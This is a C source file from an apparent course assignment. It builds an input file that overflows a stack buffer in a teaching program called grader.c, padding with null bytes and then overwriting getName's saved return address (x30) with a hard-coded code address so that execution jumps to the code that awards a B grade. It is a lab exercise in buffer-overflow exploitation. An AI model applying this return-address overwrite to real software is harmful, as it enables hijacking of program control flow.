/*--------------------------------------------------------------------*/
/*   createdataB.c                                                    */
/*   Author: Connor Brown, Laura Hwa                                  */
/*                                                                    */
/*   Produces a file called dataB with the student name, a nullbyte,  */
/*   padding to overrun the stack, and the address of the instruction */
/*   in main to get a B, the latter of which will overwrite getName's */
/*   stored x30.                                                      */
/*--------------------------------------------------------------------*/
#include <stdio.h>
#include <string.h>

/* Writes the "name" input for the grader.c prompt, byte-by-byte, to the 
   file named "dataB" */
int main (void) {
    FILE *psFile;
    char* partners = "Connor & Laura";
    int i;
    unsigned long ulMovAdr;

    psFile = fopen("dataB", "w");

    fprintf(psFile, "%s", partners);

    /* padded null bytes */
    for (i = 14; i < 48; i++) {
        fprintf(psFile, "%c", '\0');
    }

    /*overwrite getName()'s x30 with address where mov command begins.*/
    ulMovAdr = 0x400890;
    fwrite(&ulMovAdr, sizeof(unsigned long), 1, psFile);

    /* close the file */
    fclose(psFile);

    return 0;
}